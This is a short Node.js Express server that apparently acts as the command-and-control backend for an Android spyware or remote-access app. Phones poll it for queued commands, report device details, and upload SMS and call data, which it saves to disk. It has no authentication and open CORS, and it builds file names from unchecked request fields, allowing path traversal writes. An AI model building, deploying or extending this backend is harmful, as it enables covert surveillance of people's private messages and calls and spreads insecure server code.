const express = require('express');
const bodyParser = require('body-parser');
const fs = require('fs');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

// Render/Frontend connection ke liye CORS update
app.use(cors({
    origin: '*',
    methods: ['GET', 'POST']
}));

app.use(bodyParser.json({ limit: '50mb' }));
app.use(bodyParser.urlencoded({ extended: true }));
app.use(express.static(path.join(__dirname))); 

const DATA_DIR = path.join(__dirname, 'data');
if (!fs.existsSync(DATA_DIR)) fs.mkdirSync(DATA_DIR);

// Render par memory reset ho jati hai, isliye hum isse handle karenge
let deviceState = {}; 

app.get('/api/device-status/:deviceId', (req, res) => {
    const state = deviceState[req.params.deviceId] || { isOnline: false };
    const isOnline = state.lastSeen ? (Date.now() - state.lastSeen) < 20000 : false;
    res.json({ ...state, isOnline });
});

app.post('/api/send-command', (req, res) => {
    const { device_id, command } = req.body;
    if (!deviceState[device_id]) deviceState[device_id] = {};
    deviceState[device_id].currentCommand = command;
    console.log(`🚀 Command: ${command}`);
    res.json({ status: "success" });
});

// ⚠️ APP ISI URL PAR REQUEST BHEJEGI
app.post('/api/update-status', (req, res) => {
    const { device_id, model, android_version, battery, ringerMode } = req.body;
    
    deviceState[device_id] = {
        model: model || "Android Device",
        android_version: android_version || "Unknown",
        battery: battery || 0,
        ringerMode: ringerMode || "normal",
        lastSeen: Date.now(),
        currentCommand: deviceState[device_id]?.currentCommand || "none"
    };
    
    const cmd = deviceState[device_id].currentCommand;
    deviceState[device_id].currentCommand = "none"; 
    res.json({ command: cmd });
});

// Data Upload logic (SMS, Calls etc.)
app.post('/api/upload-data', (req, res) => {
    const { device_id, type, data } = req.body; 
    const filePath = path.join(DATA_DIR, `${device_id}_${type}.json`);
    fs.writeFileSync(filePath, JSON.stringify(data, null, 2));
    res.send("Saved");
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`✅ Render Server Live on Port ${PORT}`);
});
